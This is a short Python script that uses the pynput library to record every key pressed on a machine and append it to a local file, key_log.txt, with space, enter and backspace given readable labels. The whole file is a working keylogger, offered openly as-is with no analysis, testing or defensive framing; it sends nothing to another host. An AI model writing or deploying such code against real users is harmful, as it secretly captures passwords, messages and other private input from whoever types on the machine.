from pynput.keyboard import Listener

# File where the keystrokes will be logged
log_file = "key_log.txt"

# Function to write keystrokes to a file
def write_to_file(key):
    key = str(key).replace("'", "")  # Clean up the key format
    if key == "Key.space":
        key = "[SPACE]"  # Replace 'space' with a space character
    elif key == "Key.enter":
        key = "\n[ENTER]"  # Replace 'enter' with a newline
    elif key == "Key.backspace":
        key = "[BACKSPACE]"  # Log backspace for better clarity
    elif "Key" in key:
        key = ""  # Ignore other special keys like Shift, Ctrl, etc.
    
    with open(log_file, "a") as log:
        log.write(key)

# Start the listener to capture keystrokes
def main():
    with Listener(on_press=write_to_file) as listener:
        listener.join()

if __name__ == "__main__":
    main()
